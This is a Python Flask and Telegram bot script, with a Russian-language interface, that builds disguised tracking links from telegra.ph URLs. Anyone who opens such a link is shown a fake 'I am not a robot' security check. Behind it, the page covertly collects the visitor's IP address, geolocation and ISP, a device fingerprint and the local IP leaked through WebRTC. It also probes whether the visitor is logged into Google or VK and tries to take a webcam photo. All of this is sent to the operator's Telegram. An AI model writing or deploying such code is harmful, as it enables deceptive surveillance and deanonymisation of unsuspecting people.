import telebot, requests, os
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/setup-my-bot-secret')
def setup():
    bot.remove_webhook()
    return "OK" if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}") else "ERROR"

@app.route('/v/<path:aid>')
def logger(aid):
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('user-agent')
    g_info = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g_info = f"🌍 {r.get('country')}, {r.get('city')}\n📡 ISP: {r.get('isp')}\n🛡 VPN/Proxy: {'ДА' if r.get('proxy') or r.get('hosting') else 'НЕТ'}\n📍 Lat/Lon: {r.get('lat')}, {r.get('lon')}"
    except: pass
    bot.send_message(ADMIN_ID, f"🎯 КЛИК!\n👤 IP: `{ip}`\n{g_info}\n📱 UA: `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div id="u">
            <div style="font-size:60px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <p style="color:#888;">Нажмите "Я НЕ РОБОТ"</p>
            <button id="go" style="padding:15px 50px;border:none;border-radius:30px;background:#0088cc;color:#fff;font-weight:bold;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Проверка...";
            let d = {{
                hw: {{ cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory, scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, touch: navigator.maxTouchPoints }},
                net: {{ lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, webgl: "" }},
                social: {{ google: false, vk: false }},
                motion: "static", local_ip: "N/A"
            }};
            try {{
                let gl = document.createElement('canvas').getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.net.webgl = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}
            const pc = new RTCPeerConnection();
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = i => {{
                if (i.candidate) {{
                    let ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
                    if(ip) d.local_ip = ip[1];
                }}
            }};
            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.motion = "moving"; }};
            const check = (u) => new Promise(r => {{ 
                let i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = u;
            }});
            d.social.google = await check("https://accounts.google.com");
            d.social.vk = await check("https://vk.com");
            
            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg');
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "https://telegra.ph{aid}";
                        }});
                    }}, 'image/jpeg', 0.6);
                }}, 800);
            }} catch(e) {{ window.location.href = "https://telegra.ph{aid}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    m = f"🖥 ХАРД: `{d['hw']['scr']}` | `{d['hw']['cores']} Cores` | `{d['hw']['ram']}GB` | `T:{d['hw']['touch']}`\n🌐 СЕТЬ: `{d['net']['tz']}` | `{d['net']['lang']}`\n🏠 LOCAL IP: `{d.get('local_ip')}`\n🎮 GPU: `{d['net']['webgl']}`\n👤 LOGGED: `G:{d['social']['google']}` | `VK:{d['social']['vk']}`\n🏃 MOTION: `{d['motion']}`"
    bot.send_message(ADMIN_ID, m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    f = request.files.get('photo')
    if f: bot.send_photo(ADMIN_ID, f.read(), caption="📸 PHOTO")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def link(m):
    p = m.text.split("telegra.ph/")[-1].strip()
    bot.send_message(m.chat.id, f"✅ https://{request.host}/v/{p}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
